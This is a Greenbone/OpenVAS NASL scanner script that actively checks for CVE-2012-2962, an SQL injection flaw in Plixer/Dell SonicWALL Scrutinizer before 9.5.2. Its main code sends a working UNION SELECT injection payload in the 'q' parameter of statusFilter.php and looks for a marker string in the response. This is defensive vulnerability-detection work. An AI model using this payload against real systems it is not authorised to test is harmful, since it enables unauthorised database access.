# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:dell:sonicwall_scrutinizer";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103546");
  script_version("2025-02-25T13:24:30+0000");
  script_cve_id("CVE-2012-2962");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:P/A:P");
  script_tag(name:"cvss_base", value:"6.5");
  script_tag(name:"last_modification", value:"2025-02-25 13:24:30 +0000 (Tue, 25 Feb 2025)");
  script_tag(name:"creation_date", value:"2012-08-21 09:30:41 +0200 (Tue, 21 Aug 2012)");
  script_name("Plixer / Dell SonicWALL Scrutinizer < 9.5.2 'q' Parameter SQLi Vulnerability - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("gb_plixer_dell_scrutinizer_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("plixer_dell/scrutinizer/http/detected");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210123195644/http://www.securityfocus.com/bid/54625");

  script_tag(name:"summary", value:"Plixer / Dell SonicWALL Scrutinizer is prone to an SQL injection
  (SQLi) vulnerability because it fails to sufficiently sanitize user-supplied data.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"A successful exploit may allow an attacker to compromise the
  application, access or modify data, or exploit latent vulnerabilities in the underlying
  database.");

  script_tag(name:"affected", value:"Plixer / Dell SonicWALL Scrutinizer versions prior to 9.5.2.");

  script_tag(name:"solution", value:"Update to version 9.5.2 or later.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/d4d/statusFilter.php?commonJson=protList&q=x'+union+select+0,0x53514c2d496e6a656374696f6e2d54657374'+--+";

if( http_vuln_check( port:port, url:url, pattern:"SQL-Injection-Test" ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
